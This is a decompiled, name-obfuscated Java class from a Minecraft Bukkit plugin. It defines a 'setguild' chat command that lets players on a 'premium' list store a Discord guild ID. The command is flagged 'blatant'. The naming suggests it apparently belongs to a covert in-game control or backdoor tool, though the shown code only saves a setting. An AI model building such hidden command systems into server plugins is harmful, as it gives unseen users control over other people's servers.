/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium.bot;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class SetguildCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    public SetguildCommand() {
        SetguildCommand llllllllllllllllIIlIlllIIIIIllIl;
    }

    @Override
    public void execute(Core llllllllllllllllIIlIlllIIIIIIlII, String llllllllllllllllIIlIlllIIIIIIlll, String[] llllllllllllllllIIlIlllIIIIIIIll, Player llllllllllllllllIIlIlllIIIIIIlIl) {
        if (llllllllllllllllIIlIlllIIIIIIlII.premium.contains(llllllllllllllllIIlIlllIIIIIIlIl.getName())) {
            if (llllllllllllllllIIlIlllIIIIIIIll.length <= 1) {
                llllllllllllllllIIlIlllIIIIIIlIl.sendMessage(Settings.USAGE("setguild <discord guild ID>"));
            } else {
                DataManager.getData().set("id", (Object)llllllllllllllllIIlIlllIIIIIIIll[1]);
                DataManager.saveData();
                llllllllllllllllIIlIlllIIIIIIlIl.sendMessage(Settings.PREFIX("The discord guild has now been set"));
            }
        } else {
            llllllllllllllllIIlIlllIIIIIIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }
}

